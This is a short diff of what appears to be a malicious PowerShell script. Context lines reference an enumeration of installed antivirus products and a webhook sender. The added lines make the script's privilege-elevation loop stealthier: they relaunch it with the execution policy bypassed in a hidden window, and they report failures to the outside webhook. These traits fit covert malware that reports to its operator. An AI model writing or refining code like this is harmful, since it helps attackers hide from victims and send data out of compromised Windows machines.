@@ -172,18 +172,26 @@ Installed Antivirus Products (By Path):
         Write-Error "Failed to send webhook message: $($_)"
     }
 
+
     function Request-Admin {
-        while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
+        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+        
+        if (-not $isAdmin) {
             try {
-                $proc = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
+                $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+                $proc = Start-Process powershell -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden -PassThru
                 if ($proc) {
+                    Start-Sleep -Milliseconds 500
                     exit
                 }
             } catch {
+                $errorMessage = "Elevation failed: $_"
+                Send-WebhookMessage -Message $errorMessage
+                exit 1
             }
         }
     }
-    
+
     Request-Admin
 
     function Show-SilentMessageBox {
